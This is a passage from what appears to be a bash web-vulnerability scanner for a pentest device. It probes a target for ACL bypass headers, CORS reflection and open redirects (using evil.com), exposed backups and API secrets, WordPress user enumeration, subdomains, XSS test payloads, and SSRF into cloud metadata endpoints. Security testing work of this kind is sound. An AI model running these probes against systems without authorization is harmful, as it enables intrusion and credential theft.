    local xff_resp=$(curl -s -m $TIMEOUT -H "X-Forwarded-For: 127.0.0.1" "$TARGET_URL" 2>/dev/null)
    if echo "$xff_resp" | grep -q "127.0.0.1"; then
        log_finding "MEDIUM" "X-Forwarded-For may be reflected"
        play_found
    fi

    # Host header
    local host_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT -H "Host: evil.com" "$TARGET_URL" 2>/dev/null)
    if [ "$host_status" = "200" ]; then
        log_finding "MEDIUM" "Host header accepted: evil.com"
        play_found
    fi

    # X-Original-URL bypass attempt
    local bypass_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT -H "X-Original-URL: /admin" "$TARGET_URL" 2>/dev/null)
    if [ "$bypass_status" = "200" ]; then
        log_finding "HIGH" "X-Original-URL bypass possible"
        log_result ""
        log_result "    HOW TO VERIFY:"
        log_result "    Try accessing protected paths using X-Original-URL header:"
        log_result "    curl -H \"X-Original-URL: /admin\" \"$TARGET_URL\""
        log_result "    curl -H \"X-Original-URL: /console\" \"$TARGET_URL\""
        log_result "    If these return different content, ACL bypass is possible!"
        play_found
        led_found
    fi

    log_result ""
}

# 5. CORS Misconfiguration
scan_cors() {
    log_result "[+] CORS MISCONFIGURATION CHECK"
    led_scanning

    LOG "Testing CORS policy..."
    local cors=$(curl -s -m $TIMEOUT -H "Origin: https://evil.com" -I "$TARGET_URL" 2>/dev/null | grep -i "Access-Control-Allow-Origin")

    if echo "$cors" | grep -q "evil.com"; then
        log_finding "HIGH" "CORS reflects arbitrary origin!"
        play_found
        led_found
    elif echo "$cors" | grep -q "*"; then
        log_finding "HIGH" "CORS allows wildcard (*)"
        play_found
    else
        log_result "[*] No CORS issues detected"
    fi

    log_result ""
}

# 6. Redirect & SSRF Tests
scan_redirects() {
    log_result "[+] REDIRECT & SSRF TESTS"
    led_scanning

    # Test common redirect parameters
    local params=("url" "redirect" "next" "return" "dest" "destination" "redir" "redirect_uri")
    local found=0

    LOG "Testing ${#params[@]} redirect params..."
    for param in "${params[@]}"; do
        local test_url="${TARGET_URL}?${param}=https://evil.com"
        local location=$(curl -s -m $TIMEOUT -I "$test_url" 2>/dev/null | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')

        if [ -n "$location" ]; then
            # Extract the redirect destination (the actual domain being redirected TO)
            # Check if it starts with http:// or https:// followed by evil.com
            if echo "$location" | grep -qE '^https?://evil\.com(/|$)'; then
                log_finding "HIGH" "Open redirect via: $param"
                log_result "    Redirects to: $location"
                play_found
                led_found
                found=1
                sleep 0.5
            elif echo "$location" | grep -qE '^//evil\.com(/|$)'; then
                # Protocol-relative URL (//evil.com)
                log_finding "HIGH" "Open redirect via: $param"
                log_result "    Redirects to: $location"
                play_found
                led_found
                found=1
                sleep 0.5
            fi
        fi
    done

    if [ $found -eq 0 ]; then
        log_result "[*] No open redirects found"
    fi

    log_result ""
}

# Parameter Discovery
scan_parameters() {
    log_result "[+] PARAMETER DISCOVERY"
    led_scanning

    LOG "Testing common parameters..."

    # Common parameter names to test (~30 parameters for balanced approach)
    local params=(
        # Debug/Dev parameters
        "debug" "test" "dev" "admin" "trace" "verbose"
        # Access control
        "user" "username" "role" "access" "auth" "token"
        # Data retrieval
        "id" "uid" "pid" "page" "data" "item" "file" "doc"
        # Configuration
        "config" "settings" "env" "mode" "format" "lang"
        # Redirects (with different values than scan_redirects)
        "callback" "continue" "back" "source"
        # API-specific
        "api_key" "apikey" "key" "secret" "filter" "sort"
        # Other
        "version" "v" "type" "category" "query" "search"
    )

    local found_params=()
    local baseline_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
    local baseline_size=$(curl -s -m $TIMEOUT "$TARGET_URL" 2>/dev/null | wc -c | tr -d ' ')

    LOG "Baseline: HTTP $baseline_status, Size: $baseline_size bytes"

    # Generate a unique canary value that won't naturally appear on websites
    local canary="curlytest$(date +%s | tail -c 6)"
    LOG "Using canary value: $canary"

    # Calculate minimum size threshold: URL echo can add 500+ bytes from canonical/og:url/analytics
    # Real content changes should be significantly larger
    local size_threshold=1000

    for param in "${params[@]}"; do
        # Test with canary value to detect reflection, plus common values for behavior changes
        local test_url="${TARGET_URL}?${param}=${canary}"
        local response=$(curl -s -m $TIMEOUT "$test_url" 2>/dev/null)
        local status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$test_url" 2>/dev/null)
        local size=$(echo "$response" | wc -c | tr -d ' ')

        # Check if response is different from baseline
        local size_diff=$((size - baseline_size))
        size_diff=${size_diff#-}  # Absolute value

        # Consider parameter "interesting" if:
        # 1. Status code changes (but ignore rate limiting 429)
        # 2. Response size differs significantly (>1000 bytes to avoid URL echo false positives)
        # 3. Canary value is reflected in dangerous context (potential XSS)

        if [ "$status" != "$baseline_status" ]; then
            # Ignore rate limiting (429) and connection failures (000) - they're just noise
            if [ "$status" = "429" ] || [ "$status" = "000" ]; then
                # Skip rate limited or timed out responses
                continue
            fi
            log_finding "MEDIUM" "Parameter '$param' changes response status: $baseline_status → $status"
            found_params+=("$param")
        elif [ $size_diff -gt $size_threshold ]; then
            log_finding "LOW" "Parameter '$param' affects response (size change: ${size_diff} bytes)"
            found_params+=("$param")
        fi
        # NOTE: Reflection detection disabled - too many false positives from URL echo
        # in canonical tags, og:url, analytics, etc. Status and size changes are more reliable.

        sleep 0.05
    done

    # Test for parameter pollution (HPP)
    LOG "Testing parameter pollution..."
    local hpp_test="${TARGET_URL}?id=1&id=2"
    local hpp_response=$(curl -s -m $TIMEOUT "$hpp_test" 2>/dev/null)

    if echo "$hpp_response" | grep -qE "(id.*1.*2|id.*2.*1)"; then
        log_finding "LOW" "Possible parameter pollution vulnerability (multiple 'id' params processed)"
    fi

    # Summary
    if [ ${#found_params[@]} -gt 0 ]; then
        log_result ""
        log_result "[*] SUMMARY: Found ${#found_params[@]} interesting parameter(s):"
        for param in "${found_params[@]}"; do
            log_result "    - $param"
        done

        # Add manual verification guide
        log_result ""
        log_result "━━━ HOW TO VERIFY MANUALLY ━━━"
        log_result "Parameters marked 'may be reflected' could indicate XSS vulnerabilities."
        log_result ""
        log_result "Test in browser:"
        log_result "  1. Visit: ${TARGET_URL}?PARAM=TESTVALUE123"
        log_result "  2. View source (Ctrl+U), search for 'TESTVALUE123'"
        log_result "  3. If found in HTML context, test XSS:"
        log_result "     ${TARGET_URL}?PARAM=<script>alert(1)</script>"
        log_result ""
        log_result "Test with curl:"
        log_result "  curl \"${TARGET_URL}?PARAM=TEST\" | grep -i \"TEST\""
        log_result ""
        log_result "Parameters with 'size change' may accept values - test functionality:"
        log_result "  ${TARGET_URL}?page=1"
        log_result "  ${TARGET_URL}?page=2"
        log_result "  ${TARGET_URL}?page=999999 (test for errors/edge cases)"
        log_result "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    else
        log_result "[*] No interesting parameters discovered"
    fi

    log_result ""
}

# 7. API Testing
scan_api() {
    log_result "[+] API ENDPOINT TESTING"
    led_scanning

    local api_endpoints=(
        "/api"
        "/api/v1/users"
        "/api/v1/config"
        "/api/v1/admin"
        "/api/debug"
        "/api/swagger"
        "/v1/graphql"
    )

    LOG "Checking ${#api_endpoints[@]} API endpoints..."
    local found=0

    # Get baseline homepage for comparison
    local homepage_response=$(curl -s -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
    local homepage_hash=$(echo "$homepage_response" | md5sum | cut -d' ' -f1)
    local homepage_size=${#homepage_response}

    for endpoint in "${api_endpoints[@]}"; do
        local url="${TARGET_PROTO}://${TARGET_HOST}${endpoint}"
        local resp=$(curl -s -m $TIMEOUT "$url" 2>/dev/null)
        local status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$url" 2>/dev/null)

        if [ "$status" = "200" ]; then
            local resp_hash=$(echo "$resp" | md5sum | cut -d' ' -f1)
            local resp_size=${#resp}
            local is_real_api=0

            # FALSE POSITIVE CHECK: Don't report if response matches homepage
            if [ "$resp_hash" = "$homepage_hash" ]; then
                continue  # Identical to homepage, skip
            fi

            # Check if size is suspiciously similar to homepage
            local size_diff=$((resp_size - homepage_size))
            size_diff=${size_diff#-}  # Absolute value
            local threshold=$((homepage_size / 20))  # 5% threshold
            if [ $size_diff -lt $threshold ] && [ $size_diff -lt 500 ]; then
                continue  # Too similar to homepage
            fi

            # CONTENT CHECK: Verify this is actually an API response
            # Real APIs return JSON, XML, or plaintext - not HTML homepages
            if echo "$resp" | grep -qiE "<!DOCTYPE|<html|<head|<body"; then
                # It's HTML - only accept if it's API documentation
                if echo "$resp" | grep -qiE "swagger|api.?doc|openapi|graphi?ql"; then
                    is_real_api=1
                fi
                # Otherwise skip - it's just the homepage
            else
                # Not HTML - check if it looks like JSON/API response
                if echo "$resp" | grep -qE '^\s*[\{\[]|"[a-zA-Z_]+":'; then
                    is_real_api=1  # Looks like JSON
                elif echo "$resp" | grep -qiE '<\?xml|<response|<result'; then
                    is_real_api=1  # Looks like XML
                elif echo "$resp" | grep -qiE "error|message|status|data|result"; then
                    is_real_api=1  # Common API response keywords
                fi
            fi

            if [ $is_real_api -eq 1 ]; then
                log_finding "INFO" "API FOUND [$status]: $endpoint"
                found=1

                # Check for sensitive data - be more specific to avoid false positives
                # Look for actual credential patterns, not just words that appear in JS
                local has_sensitive=0

                # Check for actual password/secret values (not just the words)
                if echo "$resp" | grep -qiE '"password"\s*:\s*"[^"]+"|"secret"\s*:\s*"[^"]+"|"api_key"\s*:\s*"[^"]+"'; then
                    has_sensitive=1
                fi

                # Check for AWS-style keys
                if echo "$resp" | grep -qE 'AKIA[0-9A-Z]{16}|[a-zA-Z0-9/+=]{40}'; then
                    has_sensitive=1
                fi

                # Check for JWT tokens
                if echo "$resp" | grep -qE 'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'; then
                    has_sensitive=1
                fi

                # Check for user data exposure (arrays of user objects)
                if echo "$resp" | grep -qiE '"users"\s*:\s*\[|"email"\s*:\s*"[^"]+@|"username"\s*:\s*"[^"]+"'; then
                    has_sensitive=1
                fi

                if [ $has_sensitive -eq 1 ]; then
                    log_finding "CRITICAL" "Possible sensitive data in API response!"
                    play_found
                    led_found
                    sleep 0.5
                fi
            fi
        fi
        sleep 0.1
    done

    if [ $found -eq 0 ]; then
        log_result "[*] No API endpoints found"
    fi

    log_result ""
}

# 8. Backup File Hunter
scan_backups() {
    log_result "[+] BACKUP FILE HUNTER"
    led_scanning

    # Common backup extensions and patterns
    local base_files=("index" "config" "database" "db" "backup" "admin" "login" "wp-config")
    local extensions=(".bak" ".old" ".backup" "~" ".save" ".copy" ".orig" ".sql" ".tar.gz" ".zip")
    local found=0

    LOG "Hunting for backup files..."

    for base in "${base_files[@]}"; do
        for ext in "${extensions[@]}"; do
            local file="${base}${ext}"
            local url="${TARGET_PROTO}://${TARGET_HOST}/${file}"

            # Get both status and content-type to avoid false positives from redirects
            local response=$(curl -s -I -m $TIMEOUT "$url" 2>/dev/null)
            local status=$(echo "$response" | head -1 | grep -o "[0-9]\{3\}")
            local content_type=$(echo "$response" | grep -i "^content-type:" | cut -d':' -f2 | tr -d ' \r')

            # Only flag if 200 AND not HTML (backup files shouldn't be HTML)
            if [ "$status" = "200" ]; then
                # Ignore if it's HTML (likely a redirect to main page)
                if ! echo "$content_type" | grep -qi "text/html"; then
                    log_finding "CRITICAL" "BACKUP FOUND: /$file (${content_type})"
                    play_found
                    led_found
                    found=1
                    sleep 0.3
                fi
            fi
        done
    done

    if [ $found -eq 0 ]; then
        log_result "[*] No backup files found"
    fi

    log_result ""
}

# 9. Cookie Security Analysis
scan_cookies() {
    log_result "[+] COOKIE SECURITY ANALYSIS"
    led_scanning

    LOG "Analyzing cookies..."
    local cookies=$(curl -s -I -m $TIMEOUT "$TARGET_URL" 2>/dev/null | grep -i "^Set-Cookie:")

    if [ -z "$cookies" ]; then
        log_result "[*] No cookies set"
    else
        log_result "[*] Cookies detected, analyzing..."
        local cookie_count=$(echo "$cookies" | wc -l | tr -d ' ')
        log_result "[*] Found $cookie_count cookie(s)"

        # Check each cookie for security flags
        while IFS= read -r cookie; do
            local cookie_name=$(echo "$cookie" | sed 's/Set-Cookie: //' | cut -d'=' -f1 | tr -d '\r')

            # Check for HttpOnly flag
            if ! echo "$cookie" | grep -qi "HttpOnly"; then
                log_finding "MEDIUM" "Cookie '$cookie_name' missing HttpOnly flag"
                play_found
            fi

            # Check for Secure flag
            if ! echo "$cookie" | grep -qi "Secure"; then
                log_finding "MEDIUM" "Cookie '$cookie_name' missing Secure flag"
                play_found
            fi

            # Check for SameSite
            if ! echo "$cookie" | grep -qi "SameSite"; then
                log_finding "LOW" "Cookie '$cookie_name' missing SameSite flag"
            fi
        done <<< "$cookies"
    fi

    log_result ""
}

# 10. WAF/CDN Detection
scan_waf() {
    log_result "[+] WAF/CDN DETECTION"
    led_scanning

    LOG "Detecting protection..."
    local headers=$(curl -s -I -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
    local found_waf=0

    # Cloudflare - Check both headers AND nameservers
    local cloudflare_detected=0

    # Check headers first
    if echo "$headers" | grep -qi "cloudflare\|cf-ray"; then
        cloudflare_detected=1
    fi

    # Check DNS nameservers as fallback (Cloudflare nameservers typically end in .ns.cloudflare.com)
    if [ $cloudflare_detected -eq 0 ]; then
        LOG "Checking DNS nameservers for Cloudflare..."
        local nameservers=$(nslookup -type=ns "$TARGET_HOST" 2>/dev/null | grep -i "cloudflare")
        if [ -n "$nameservers" ]; then
            cloudflare_detected=1
        fi
    fi

    if [ $cloudflare_detected -eq 1 ]; then
        log_result "[*] WAF/CDN: Cloudflare detected"
        found_waf=1
    fi

    # Akamai
    if echo "$headers" | grep -qi "akamai"; then
        log_result "[*] CDN: Akamai detected"
        found_waf=1
    fi

    # AWS CloudFront
    if echo "$headers" | grep -qi "cloudfront\|x-amz-cf-id"; then
        log_result "[*] CDN: AWS CloudFront detected"
        found_waf=1
    fi

    # Incapsula
    if echo "$headers" | grep -qi "incapsula\|x-iinfo"; then
        log_result "[*] WAF: Incapsula detected"
        found_waf=1
    fi

    # Sucuri
    if echo "$headers" | grep -qi "sucuri"; then
        log_result "[*] WAF: Sucuri detected"
        found_waf=1
    fi

    # ModSecurity
    if echo "$headers" | grep -qi "mod_security\|NOYB"; then
        log_result "[*] WAF: ModSecurity detected"
        found_waf=1
    fi

    # Generic WAF detection via suspicious blocks
    local test_payload="${TARGET_URL}?test=<script>alert(1)</script>"
    local test_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$test_payload" 2>/dev/null)

    if [ "$test_status" = "403" ] || [ "$test_status" = "406" ]; then
        log_result "[*] Possible WAF detected (blocks XSS test)"
        found_waf=1
    fi

    if [ $found_waf -eq 0 ]; then
        log_result "[*] No WAF/CDN detected"
    fi

    log_result ""
}

# 11. Technology Fingerprinting
scan_tech() {
    log_result "[+] TECHNOLOGY FINGERPRINTING"
    led_scanning

    LOG "Fingerprinting tech stack..."
    local headers=$(curl -s -I -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
    # Get first 50KB of HTML (enough to catch WP indicators)
    local body=$(curl -s -m $TIMEOUT "$TARGET_URL" 2>/dev/null | head -c 50000)

    # Web servers
    local server=$(echo "$headers" | grep -i "^Server:" | cut -d':' -f2- | tr -d '\r' | sed 's/^ //')
    [ -n "$server" ] && log_result "[*] Web Server: $server"

    # PHP version
    if echo "$headers" | grep -qi "X-Powered-By.*PHP"; then
        local php_ver=$(echo "$headers" | grep -i "X-Powered-By" | grep -o "PHP/[0-9.]*" | tr -d '\r')
        log_result "[*] Backend: $php_ver"
    fi

    # WordPress Detection (multiple methods)
    local is_wordpress=0

    # Method 1: Check HTML for ACTUAL WordPress technical indicators (not just mentions)
    # Look for WordPress-specific paths and generator tags, not just the word "wordpress"
    if echo "$body" | grep -qE '<meta name="generator" content="WordPress|/wp-content/themes/|/wp-content/plugins/|/wp-includes/'; then
        is_wordpress=1
    fi

    # Method 2: Check headers for Pantheon (WordPress hosting)
    if echo "$headers" | grep -qi "pantheon\|x-pantheon"; then
        is_wordpress=1
        log_result "[*] Pantheon hosting detected (WordPress platform)"
    fi

    # Method 3: Test for wp-json API endpoint (with content verification)
    if [ $is_wordpress -eq 0 ]; then
        local wp_api_response=$(curl -s -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/wp-json/" 2>/dev/null)
        # Check if response is valid JSON and contains WordPress REST API namespace
        if echo "$wp_api_response" | grep -qi "namespace.*wp/v2\|\"name\":.*\"wordpress\""; then
            is_wordpress=1
        fi
    fi

    # Method 4: Test for wp-login.php (with content verification)
    if [ $is_wordpress -eq 0 ]; then
        local wp_login_response=$(curl -s -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/wp-login.php" 2>/dev/null)
        # Check if response contains actual WordPress login form elements
        if echo "$wp_login_response" | grep -qi "wp-submit\|user_login\|\"log in to \|powered by wordpress"; then
            is_wordpress=1
        fi
    fi

    # If WordPress detected by any method, run tests
    if [ $is_wordpress -eq 1 ]; then
        log_result "[*] CMS: WordPress detected"

        # Try to get version
        local wp_ver=$(curl -s -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/readme.html" 2>/dev/null | grep -i "Version" | head -1)
        [ -n "$wp_ver" ] && log_result "[*] $wp_ver"

        # WordPress-specific tests
        log_result "[*] Running WordPress tests..."

        # Test for user enumeration via REST API
        local wp_users=$(curl -s -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/wp-json/wp/v2/users" 2>/dev/null)
        if echo "$wp_users" | grep -qi "slug\|name"; then
            log_finding "MEDIUM" "WP REST API user enumeration enabled!"
            play_found
            led_found
        fi

        # Test for user enumeration via ?author=1
        local author_page=$(curl -s -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/?author=1" 2>/dev/null)
        if echo "$author_page" | grep -qiE "author/|posts by"; then
            log_finding "MEDIUM" "WP user enumeration via ?author=1"
            play_found
        fi

        # Test for xmlrpc
        local xmlrpc_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/xmlrpc.php" 2>/dev/null)
        if [ "$xmlrpc_status" = "200" ]; then
            log_finding "LOW" "xmlrpc.php accessible"
            play_found
        fi

        # Test for debug log
        local debug_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/wp-content/debug.log" 2>/dev/null)
        if [ "$debug_status" = "200" ]; then
            log_finding "CRITICAL" "debug.log exposed!"
            play_found
            led_found
        fi

        # Test for wp-admin
        local admin_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/wp-admin/" 2>/dev/null)
        if [ "$admin_status" = "200" ] || [ "$admin_status" = "302" ]; then
            log_result "[*] wp-admin accessible"
        fi

        # Test for wp-login.php
        local login_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "${TARGET_PROTO}://${TARGET_HOST}/wp-login.php" 2>/dev/null)
        if [ "$login_status" = "200" ]; then
            log_result "[*] wp-login.php accessible"
        fi
    fi

    # Drupal
    if echo "$body" | grep -qi "drupal"; then
        log_result "[*] CMS: Drupal detected"
    fi

    # Joomla
    if echo "$body" | grep -qi "joomla"; then
        log_result "[*] CMS: Joomla detected"
    fi

    # React
    if echo "$body" | grep -qi "react"; then
        log_result "[*] Frontend: React detected"
    fi

    # Vue.js
    if echo "$body" | grep -qi "vue\.js\|__vue__"; then
        log_result "[*] Frontend: Vue.js detected"
    fi

    # Angular
    if echo "$body" | grep -qi "ng-app\|angular"; then
        log_result "[*] Frontend: Angular detected"
    fi

    # jQuery
    if echo "$body" | grep -qi "jquery"; then
        local jquery_ver=$(echo "$body" | grep -o "jquery[/-][0-9.]*" | head -1 | tr -d '\r')
        [ -n "$jquery_ver" ] && log_result "[*] Library: $jquery_ver"
    fi

    log_result ""
}

# 12. Common Subdomain Checker
scan_subdomains() {
    log_result "[+] SUBDOMAIN ENUMERATION"
    led_scanning

    # Common subdomains to test
    local subdomains=(
        "www" "api" "admin" "dev" "staging" "test"
        "beta" "demo" "portal" "dashboard" "app" "mail"
        "ftp" "vpn" "ssh" "remote" "store" "shop"
        "blog" "forum" "status" "help" "support" "cdn"
        "static" "assets" "images" "media" "upload" "files"
        "mobile" "m" "secure" "login" "auth" "sso"
        "sandbox" "uat" "qa" "prod" "old" "new"
        "v2" "api2" "backend" "server" "db" "database"
        "cloud" "git" "gitlab" "jenkins" "monitor"
    )

    LOG "Testing ${#subdomains[@]} subdomains..."
    local found=0
    local tested=0
    local found_list=()

    for subdomain in "${subdomains[@]}"; do
        tested=$((tested + 1))

        # Progress indicator every 10 subdomains
        if [ $((tested % 10)) -eq 0 ]; then
            LOG "Tested $tested/${#subdomains[@]}..."
        fi

        local test_url="${TARGET_PROTO}://${subdomain}.${TARGET_HOST}"
        local status=$(curl -s -o /dev/null -w "%{http_code}" -m 3 "$test_url" 2>/dev/null)

        # Consider these status codes as "subdomain exists"
        case "$status" in
            200|301|302|303|307|308|401|403)
                log_result "[!] FOUND: ${subdomain}.${TARGET_HOST} [HTTP $status]"
                found=$((found + 1))
                found_list+=("${subdomain}")
                play_found
                led_found
                sleep 0.2
                ;;
            *)
                # Silent for 404, 000 (doesn't exist/timeout)
                ;;
        esac

        sleep 0.05
    done

    log_result ""
    if [ $found -eq 0 ]; then
        log_result "[*] No common subdomains found"
    else
        log_result "[*] SUMMARY: Found $found subdomain(s):"
        for sub in "${found_list[@]}"; do
            log_result "    - ${sub}.${TARGET_HOST}"
        done
    fi

    log_result ""
}

# 13. HTML Source Analysis
scan_html_source() {
    log_result "[+] HTML SOURCE ANALYSIS"
    led_scanning

    LOG "Analyzing HTML source..."
    local body=$(curl -s -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
    local found=0

    # Extract HTML comments
    local comments=$(echo "$body" | grep -o '<!--.*-->' | head -10)
    if [ -n "$comments" ]; then
        log_result "[*] HTML Comments found:"
        while IFS= read -r comment; do
            # Clean up and shorten
            comment=$(echo "$comment" | sed 's/<!--//g; s/-->//g' | tr -d '\r' | head -c 100)
            [ -n "$comment" ] && log_result "    $comment"
            found=1
        done <<< "$comments"
    fi

    # Extract email addresses
    local emails=$(echo "$body" | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u | head -5)
    if [ -n "$emails" ]; then
        log_finding "INFO" "Email addresses found:"
        while IFS= read -r email; do
            log_result "    $email"
            found=1
        done <<< "$emails"
    fi

    # Look for API keys (common patterns)
    if echo "$body" | grep -qiE 'api[_-]?key|apikey|access[_-]?token|secret[_-]?key'; then
        log_finding "CRITICAL" "Possible API key references in source!"
        play_found
        led_found
        found=1
    fi

    # Look for internal URLs/paths
    local internal_urls=$(echo "$body" | grep -oE '(https?://[^"'"'"' >]+|/[a-zA-Z0-9/_-]+)' | grep -E '(internal|dev|staging|test|admin|api)' | sort -u | head -5)
    if [ -n "$internal_urls" ]; then
        log_finding "MEDIUM" "Internal URLs found:"
        while IFS= read -r url; do
            log_result "    $url"
            found=1
            play_found
        done <<< "$internal_urls"
    fi

    # Look for TODO/FIXME in HTML comments only (not in JS libraries)
    if echo "$comments" | grep -qiE 'TODO|FIXME|HACK|XXX|BUG'; then
        log_finding "LOW" "Developer comments (TODO/FIXME) in HTML comments"
        # Show which ones were found
        local dev_comments=$(echo "$comments" | grep -iE 'TODO|FIXME|HACK|XXX|BUG' | head -3)
        while IFS= read -r comment; do
            [ -n "$comment" ] && log_result "    $(echo "$comment" | sed 's/<!--//g; s/-->//g' | tr -d '\r' | head -c 80)"
        done <<< "$dev_comments"
        found=1
        play_found
    fi

    # Look for stack traces or error messages (in visible HTML, not JS)
    # Only flag if we find actual stack traces, not just the word "error"
    if echo "$body" | grep -qiE '<pre.*stack|<div.*exception|Fatal error:|Uncaught|Notice:|Warning:.*line'; then
        log_finding "MEDIUM" "Possible stack trace/error in source"
        found=1
        play_found
    fi

    if [ $found -eq 0 ]; then
        log_result "[*] No interesting data in HTML source"
    fi

    log_result ""
}

# 14. Cloud Metadata Endpoints
scan_cloud_metadata() {
    log_result "[+] CLOUD METADATA ENDPOINTS"
    led_scanning

    LOG "Testing cloud metadata APIs..."
    local found=0

    # Get baseline: normal page response for comparison
    LOG "Getting baseline response..."
    local baseline_response=$(curl -s -m $TIMEOUT "$TARGET_URL" 2>/dev/null)
    local baseline_size=${#baseline_response}
    LOG "Baseline size: $baseline_size bytes"

    # Helper function to check if response contains metadata
    check_metadata_content() {
        local response="$1"
        local provider="$2"

        # AWS metadata keywords
        if [ "$provider" = "aws" ]; then
            if echo "$response" | grep -qE 'ami-id|instance-id|instance-type|local-hostname|local-ipv4|public-hostname|security-credentials'; then
                return 0  # Found metadata
            fi
        fi

        # GCP metadata keywords
        if [ "$provider" = "gcp" ]; then
            if echo "$response" | grep -qE 'computeMetadata|instance/id|instance/hostname|instance/zone|service-accounts'; then
                return 0  # Found metadata
            fi
        fi

        # Azure metadata keywords
        if [ "$provider" = "azure" ]; then
            if echo "$response" | grep -qE '"vmId"|"subscriptionId"|"resourceGroupName"|"compute":|"network":'; then
                return 0  # Found metadata
            fi
        fi

        return 1  # No metadata found
    }

    # AWS Metadata
    log_result "[*] Testing AWS metadata..."
    local aws_meta="${TARGET_URL}?url=http://169.254.169.254/latest/meta-data/"
    local aws_response=$(curl -s -m $TIMEOUT "$aws_meta" 2>/dev/null)
    local aws_size=${#aws_response}
    local aws_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$aws_meta" 2>/dev/null)

    if [ "$aws_status" = "200" ]; then
        # Check if response is different from baseline
        local size_diff=$((aws_size - baseline_size))
        size_diff=${size_diff#-}  # Absolute value

        if check_metadata_content "$aws_response" "aws"; then
            log_finding "CRITICAL" "CONFIRMED AWS SSRF - Metadata content detected!"
            play_found
            led_found
            found=1
        elif [ $size_diff -gt 1000 ]; then
            log_result "[?] Possible AWS SSRF (different response size: $aws_size vs $baseline_size) - VERIFY MANUALLY"
            found=1
        else
            log_result "[*] AWS test returned 200 but appears to be normal page (likely false positive)"
        fi
    fi

    # Try direct access (if scanner is running on AWS)
    local aws_direct=$(curl -s -m 2 "http://169.254.169.254/latest/meta-data/" 2>/dev/null)
    if [ -n "$aws_direct" ] && check_metadata_content "$aws_direct" "aws"; then
        log_finding "CRITICAL" "Direct AWS metadata access (scanner running on AWS instance)"
        play_found
        led_found
        found=1
    fi

    # GCP Metadata
    log_result "[*] Testing GCP metadata..."
    local gcp_meta="${TARGET_URL}?url=http://metadata.google.internal/computeMetadata/v1/"
    local gcp_response=$(curl -s -m $TIMEOUT "$gcp_meta" 2>/dev/null)
    local gcp_size=${#gcp_response}
    local gcp_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$gcp_meta" 2>/dev/null)

    if [ "$gcp_status" = "200" ]; then
        local size_diff=$((gcp_size - baseline_size))
        size_diff=${size_diff#-}

        if check_metadata_content "$gcp_response" "gcp"; then
            log_finding "CRITICAL" "CONFIRMED GCP SSRF - Metadata content detected!"
            play_found
            led_found
            found=1
        elif [ $size_diff -gt 1000 ]; then
            log_result "[?] Possible GCP SSRF (different response size: $gcp_size vs $baseline_size) - VERIFY MANUALLY"
            found=1
        else
            log_result "[*] GCP test returned 200 but appears to be normal page (likely false positive)"
        fi
    fi

    # Azure Metadata
    log_result "[*] Testing Azure metadata..."
    local azure_meta="${TARGET_URL}?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    local azure_response=$(curl -s -m $TIMEOUT "$azure_meta" 2>/dev/null)
    local azure_size=${#azure_response}
    local azure_status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$azure_meta" 2>/dev/null)

    if [ "$azure_status" = "200" ]; then
        local size_diff=$((azure_size - baseline_size))
        size_diff=${size_diff#-}

        if check_metadata_content "$azure_response" "azure"; then
            log_finding "CRITICAL" "CONFIRMED Azure SSRF - Metadata content detected!"
            play_found
            led_found
            found=1
        elif [ $size_diff -gt 1000 ]; then
            log_result "[?] Possible Azure SSRF (different response size: $azure_size vs $baseline_size) - VERIFY MANUALLY"
            found=1
        else
            log_result "[*] Azure test returned 200 but appears to be normal page (likely false positive)"
        fi
    fi

    # Test common SSRF parameters with smarter detection
    log_result "[*] Testing common SSRF parameters..."
    local ssrf_params=("url" "file" "path" "redirect" "uri" "link" "src")
    local param_found=0

    for param in "${ssrf_params[@]}"; do
        local test_url="${TARGET_URL}?${param}=http://169.254.169.254/"
        local param_response=$(curl -s -m $TIMEOUT "$test_url" 2>/dev/null)
        local param_size=${#param_response}
        local status=$(curl -s -o /dev/null -w "%{http_code}" -m $TIMEOUT "$test_url" 2>/dev/null)

        if [ "$status" = "200" ]; then
            local size_diff=$((param_size - baseline_size))
            size_diff=${size_diff#-}

            # Check for metadata content or significant size difference
            if check_metadata_content "$param_response" "aws" || \
               check_metadata_content "$param_response" "gcp" || \
               check_metadata_content "$param_response" "azure"; then
                log_finding "CRITICAL" "CONFIRMED SSRF via parameter: $param (metadata content detected)"
                play_found
                led_found
                param_found=1
                found=1
            elif [ $size_diff -gt 1000 ]; then
                log_result "[?] Possible SSRF via parameter: $param (different response) - VERIFY MANUALLY"
                param_found=1
                found=1
            fi
        elif [ "$status" = "500" ]; then
            # 500 could indicate server tried to process the URL
            log_result "[?] Parameter '$param' caused 500 error (might process URLs) - VERIFY MANUALLY"
            param_found=1
            found=1
        fi
    done

    if [ $param_found -eq 0 ]; then
        log_result "[*] No SSRF parameters detected"
    fi

    if [ $found -eq 0 ]; then
